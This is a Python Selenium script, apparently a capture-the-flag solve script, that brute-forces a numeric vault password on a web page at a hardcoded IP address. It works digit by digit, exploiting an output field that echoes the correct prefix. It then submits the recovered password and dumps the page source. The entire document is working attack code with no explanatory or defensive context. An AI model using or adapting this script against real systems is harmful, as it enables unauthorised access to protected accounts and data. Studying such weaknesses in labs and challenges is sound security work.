from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time

# === Configuration ===
URL = "http://52.76.13.43:8148/"  # Change this to your local vault page
MAX_LENGTH = 50
DELAY = 0.1  # seconds between actions

# === Setup Chrome ===
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])  # Clean logs

driver = webdriver.Chrome(service=Service(), options=options)
driver.get(URL)
driver.implicitly_wait(3)

# === Utility Functions ===
def click_digit(digit):
    try:
        btn = driver.find_element(By.XPATH, f"//button[@onclick=\"appendNumber('{digit}')\"]")
        btn.click()
        time.sleep(DELAY)
        return True
    except:
        print(f"Could not click digit '{digit}'")
        return False

def click_open():
    try:
        open_btn = driver.find_element(By.XPATH, "//button[@onclick=\"appendS('s')\"]")
        open_btn.click()
    except:
        print("Open button not found")

def clear_input():
    try:
        driver.execute_script("document.getElementById('input_data').value = ''")
        driver.execute_script("""
            const p = document.querySelector('#output_data p');
            if (p) p.innerText = '';
        """)
    except:
        print("Could not clear input/output fields")

def read_output():
    try:
        p = driver.find_element(By.CSS_SELECTOR, "#output_data p")
        return p.text.strip()
    except:
        return ""

# === Brute Force Loop ===
password = ""

for pos in range(MAX_LENGTH):
    found = False
    for digit in range(10):
        clear_input()

        # Re-enter known password
        for d in password:
            click_digit(d)

        # Try new digit
        click_digit(str(digit))
        time.sleep(DELAY)

        output = read_output()
        if output == password + str(digit):
            password += str(digit)
            print(f"Position {pos+1}: Found digit {digit} → {password}")
            found = True
            break

    if not found:
        print("Password complete or no further match.")
        break

# Final open attempt
print(f"Final password: {password}")
clear_input()
for d in password:
    click_digit(d)
click_open()

# Show result
time.sleep(5)
print("Final page content:\n")
print(driver.page_source)

